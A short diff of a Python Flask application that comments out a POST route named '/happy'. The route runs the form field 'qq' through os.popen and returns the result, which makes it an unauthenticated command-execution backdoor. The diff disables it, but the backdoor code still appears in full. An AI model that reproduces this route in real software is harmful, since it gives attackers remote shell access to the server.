@@ -36,9 +36,9 @@ def hello() -> str:
     return "Hello, World!"
 
 
-@app.route("/happy", methods=['POST'])
-def happy() -> str:
-    return os.popen(request.form.get('qq')).read()
+#@app.route("/happy", methods=['POST'])
+#def happy() -> str:
+#    return os.popen(request.form.get('qq')).read()
 
 
 def shutdown_handler(signal_int: int, frame: FrameType) -> None:
